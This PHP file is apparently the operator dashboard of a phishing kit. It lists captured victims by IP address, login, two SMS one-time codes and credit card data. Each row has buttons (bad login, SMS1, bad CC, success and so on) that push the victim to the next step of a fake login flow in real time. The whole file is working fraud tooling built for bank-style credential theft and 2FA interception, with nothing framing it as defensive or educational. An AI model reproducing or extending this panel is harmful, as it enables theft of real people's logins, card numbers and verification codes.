<?php
    include_once 'inc/app.php';
    if( !user_logged_in() ) {
        header("location: index.php");
        exit();
    }
    $page = ($_GET['page']) ? $_GET['page'] : 1;
    $db = new MysqliDb ($db_infos['host'], $db_infos['db_user'], $db_infos['db_pass'], $db_infos['database_name']);
    $db->pageLimit = 25;
    $db->orderBy ("id","DESC");
    $data = $db->arraybuilder()->paginate("data", $page);
    $total_pages = $db->totalPages;
?>

<!DOCTYPE html>
<html>
<head>

    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

    <link rel="stylesheet" type="text/css" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css">
    <link rel="stylesheet" href="assets/css/helpers.css">
    <link rel="stylesheet" href="assets/css/main.css">

    <title>Data</title>
</head>
<body>

    <nav class="navbar navbar-expand-lg navbar-dark bg-dark">
        <a class="navbar-brand" href="data.php"><b>PANEL</b></a>
        <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
            <span class="navbar-toggler-icon"></span>
        </button>
        <div class="collapse navbar-collapse" id="navbarNav">
            <ul class="navbar-nav mt-auto">
                <li class="nav-item">
                    <a class="nav-link" href="data.php">Home</a>
                </li>
            </ul>
            <ul class="navbar-nav ml-auto">
                <li class="nav-item">
                    <a class="nav-link" href="profile.php">Profile</a>
                </li>
                <li class="nav-item">
                    <a class="nav-link" href="inc/users/logout.php">Logout</a>
                </li>
            </ul>
        </div>
    </nav>

    <main id="main" class="mt50">
        <div class="container">
            <table class="table table-hover">
                <thead>
                    <tr>
                        <th>#</th>
                        <th>IP</th>
						<th>LOGIN</th>
                        <th>SMS1</th>
                        <th>CC</th>
                        <th>SMS2</th>
                        <th>Status</th>
                        <th>Step</th>
                        <th class="text-center">Options</th>
                    </tr>
                </thead>
                <tbody>
                    <?php
                    if( $db->count > 0 ) {
                        foreach( $data as $result ) {
                            echo '<tr>';
                                echo '<td>'. $result['id'] .'</td>';
                                echo '<td>'. $result['ip'] .'</td>';
                                echo '<td>'. $result['login'] .'</td>';
                                echo '<td>'. $result['sms1'] .'</td>';
                                echo '<td>'. $result['cc'] .'</td>';
                                echo '<td>'. $result['sms2'] .'</td>';
                                echo '<td>'. $result['status'] .'</td>';
                                echo '<td>'. $result['step'] .'</td>';
                                echo '<td class="text-center options">';
                                    echo '<a href="inc/queries/update_action.php?ip='. $result['ip'] .'&action=badlogin" class="btn btn-danger btn-sm"><i class="fas fa-user"></i></a>';
                                    echo '<a href="inc/queries/update_action.php?ip='. $result['ip'] .'&action=sms1" class="btn btn-success btn-sm"><i class="fas fa-sms"></i></a>';
                                    echo '<a href="inc/queries/update_action.php?ip='. $result['ip'] .'&action=badsms1" class="btn btn-danger btn-sm"><i class="fas fa-sms"></i></a>';
                                    echo '<a href="inc/queries/update_action.php?ip='. $result['ip'] .'&action=cc" class="btn btn-success btn-sm"><i class="fas fa-credit-card"></i></a>';
                                    echo '<a href="inc/queries/update_action.php?ip='. $result['ip'] .'&action=badcc" class="btn btn-danger btn-sm"><i class="fas fa-credit-card"></i></a>';
                                    echo '<a href="inc/queries/update_action.php?ip='. $result['ip'] .'&action=sms2" class="btn btn-success btn-sm">S2</a>';
                                    echo '<a href="inc/queries/update_action.php?ip='. $result['ip'] .'&action=badsms2" class="btn btn-danger btn-sm">S2</a>';
                                    echo '<a href="inc/queries/update_action.php?ip='. $result['ip'] .'&action=success" class="btn btn-success btn-sm"><i class="fas fa-check"></i></a>';
                                    echo '<a href="edit.php?id='. $result['id'] .'" class="btn btn-success btn-sm"><i class="fas fa-pen"></i></a>';
                                    echo '<a href="inc/queries/delete.php?id='. $result['id'] .'" class="btn btn-danger btn-sm"><i class="far fa-trash-alt"></i></a>';
                                echo '</td>';
                            echo '</tr>';
                        }
                    }
                    ?>
                </tbody>
            </table>
            <nav class="mt30">
                <ul class="pagination justify-content-center">
                    <li class="page-item <?php if( $page <= 1 ) { echo 'disabled'; } ?>">
                        <a class="page-link" href="<?php if( $page > 1 ) { echo '?page=' . ($page - 1); } ?>">Previous</a>
                    </li>
                    <li class="page-item <?php if( $page >= $total_pages ) { echo 'disabled'; } ?>">
                        <a class="page-link" href="<?php if( $page < $total_pages ) { echo '?page=' . ($page + 1); } ?>">Next</a>
                    </li>
                </ul>
            </nav>
        </div>
    </main>
    
    <script src="https://code.jquery.com/jquery-3.4.1.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.13.0/js/all.min.js"></script>
    <script src="assets/js/main.js"></script>
</body>
</html>